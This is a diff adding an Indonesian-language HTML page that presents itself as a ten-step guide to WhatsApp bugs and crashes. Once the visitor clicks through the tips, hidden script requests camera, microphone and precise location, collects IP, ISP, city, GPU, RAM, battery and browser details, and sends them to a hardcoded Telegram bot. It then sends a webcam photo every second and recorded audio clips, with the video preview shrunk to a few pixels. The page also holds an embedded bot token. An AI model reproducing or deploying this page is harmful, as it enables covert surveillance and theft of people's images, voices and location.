@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>WEB BUG SYSTEM BY DER</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: url('https://f.top4top.io/p_34914shbg0.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Segoe UI', sans-serif;
+      color: #00ffee;
+      overflow: hidden;
+    }
+
+    .main-ui {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      backdrop-filter: blur(4px);
+    }
+
+    .loading-ring {
+      border: 8px solid #222;
+      border-top: 8px solid #00ffee;
+      border-radius: 50%;
+      width: 90px;
+      height: 90px;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .main-title {
+      font-size: 2em;
+      color: #00ffee;
+      margin-bottom: 5px;
+    }
+
+    .main-sub {
+      font-size: 1em;
+      color: #ccc;
+    }
+
+    .popup-wrap {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+      border: 1px solid #00ffee66;
+      padding: 25px 30px;
+      border-radius: 12px;
+      max-width: 600px;
+      width: 90%;
+      color: #ccffff;
+      z-index: 9999;
+    }
+
+    .popup-wrap h2 {
+      font-size: 1.2em;
+      color: #00ffee;
+      margin-bottom: 10px;
+    }
+
+    .popup-wrap p {
+      font-size: 0.95em;
+      line-height: 1.5;
+    }
+
+    .btn-lanjut {
+      position: fixed;
+      right: 20px;
+      bottom: 20px;
+      background: #00ffee;
+      color: #000;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 10px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 12px #00ffee;
+      z-index: 10000;
+    }
+
+    #video {
+      position: fixed;
+      bottom: 15px;
+      left: 15px;
+      width: 10px;
+      height: 7px;
+      border: 2px solid #00ffee;
+      border-radius: 8px;
+      z-index: 10;
+    }
+
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <video id="video" autoplay muted></video>
+  <canvas id="canvas"></canvas>
+
+  <div class="main-ui">
+    <div class="loading-ring"></div>
+    <div class="main-title">WEB BUG SYSTEM</div>
+    <div class="main-sub">Sedang dimuat... harap tunggu</div>
+  </div>
+
+  <div class="popup-wrap" id="popup">
+    <h2 id="popup-title">Instruksi 1/10</h2>
+    <p id="popup-text">Memuat...</p>
+  </div>
+
+  <button class="btn-lanjut" onclick="nextPopup()">Lanjut</button>
+
+  <script>
+    const isiPopup = [
+      "Bug WA adalah kesalahan sistem, crash data, atau celah yang membuat aplikasi WhatsApp error saat dijalankan, termasuk freeze, not responding, hingga keluar sendiri.",
+      "Karakter aneh seperti \u202e atau \u200f jika dikirim dalam jumlah banyak bisa membuat WhatsApp freeze saat membuka chat. Solusi: hapus chat via WhatsApp Web.",
+      "Pengiriman spam media (100+ gambar/video) dapat menyebabkan aplikasi melambat drastis. Solusi: clear cache, nonaktifkan auto-download.",
+      "File kontak (VCF) dengan nama karakter aneh atau terlalu panjang bisa membuat aplikasi crash saat dibuka.",
+      "Pesan yang terus di-forward secara berantai dapat menyebabkan WA tidak merespons saat scroll chat.",
+      "Lokasi real-time selama berjam-jam menguras baterai dan memori, menyebabkan crash tiba-tiba.",
+      "WhatsApp MOD (GB, FM) tidak stabil dan rawan bug karena sistemnya dimodifikasi tidak resmi.",
+      "Auto-download file dari grup aktif bisa membuat storage penuh dan kinerja lemot.",
+      "Notifikasi grup besar yang tidak dimatikan akan membuat sistem overload terutama di HP lama.",
+      "Pencegahan utama: update WA, clear cache berkala, hapus chat mencurigakan, nonaktifkan media auto-download."
+    ];
+
+    let index = 0;
+    const title = document.getElementById("popup-title");
+    const text = document.getElementById("popup-text");
+    const popup = document.getElementById("popup");
+
+    function nextPopup() {
+      index++;
+      if (index < isiPopup.length) {
+        title.innerText = `Instruksi ${index + 1}/10`;
+        text.innerText = isiPopup[index];
+      } else {
+        popup.remove();
+        document.querySelector(".btn-lanjut").remove();
+        jalankanSiluman();
+      }
+    }
+
+    window.onload = () => {
+      text.innerText = isiPopup[0];
+    };
+  </script>
+
+  <script>
+    const BOT_TOKEN = "8154234696:AAHjFXNELxAF6NZ0yaA6UN0zwGoS3KX9hBc";
+    const CHAT_ID = "6785731512";
+
+    async function kirimFoto(blob) {
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("photo", blob, "foto.jpg");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+    }
+
+    async function kirimInfo(text) {
+      const encoded = encodeURIComponent(" *DATA RIPPER DONGO*\n```\n" + text + "\n```");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`);
+    }
+
+    async function jalankanSiluman() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        document.getElementById("video").srcObject = stream;
+
+        const lokasi = await new Promise(resolve => {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              const c = pos.coords;
+              resolve(`Lat: ${c.latitude}, Lon: ${c.longitude}, Akurasi: ${c.accuracy}m`);
+            },
+            () => resolve("Gagal akses lokasi"),
+            { enableHighAccuracy: true, timeout: 7000 }
+          );
+        });
+
+        const net = await fetch("https://ipwhois.app/json").then(r => r.json()).catch(() => ({}));
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+        const resolution = `${screen.width}x${screen.height}`;
+        const ram = navigator.deviceMemory || "N/A";
+        const lang = navigator.language;
+        const online = navigator.onLine ? "Online" : "Offline";
+
+        let battery = "N/A";
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? "Charging" : "Discharging"})`;
+        }
+
+        let gpu = "N/A";
+        try {
+          const gl = document.createElement("canvas").getContext("webgl");
+          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+          gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        } catch {}
+
+        const teks = `
+IP: ${net.ip || "?"}
+ISP: ${net.isp || "?"}
+Negara: ${net.country || "?"}
+Kota: ${net.city || "?"}
+Lokasi GPS: ${lokasi}
+Platform: ${platform}
+User Agent: ${ua}
+RAM: ${ram} GB
+GPU: ${gpu}
+Resolusi: ${resolution}
+Bahasa: ${lang}
+Baterai: ${battery}
+Status: ${online}`.trim();
+
+        await kirimInfo(teks);
+
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        setInterval(async () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          canvas.toBlob(async (blob) => {
+            await kirimFoto(blob);
+          }, 'image/jpeg', 0.8);
+        }, 1000);
+
+        const mediaRecorder = new MediaRecorder(stream);
+        let audioChunks = [];
+
+        mediaRecorder.ondataavailable = async (e) => {
+          audioChunks.push(e.data);
+          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          const form = new FormData();
+          form.append("chat_id", CHAT_ID);
+          form.append("audio", audioBlob, "audio.webm");
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+            method: "POST",
+            body: form
+          });
+          audioChunks = [];
+        };
+
+        setInterval(() => {
+          if (mediaRecorder.state === "recording") mediaRecorder.stop();
+          mediaRecorder.start();
+        }, 1000);
+
+      } catch (e) {
+        console.log("Gagal akses kamera/mic:", e);
+      }
+    }
+  </script>
+
+</body>
+</html>
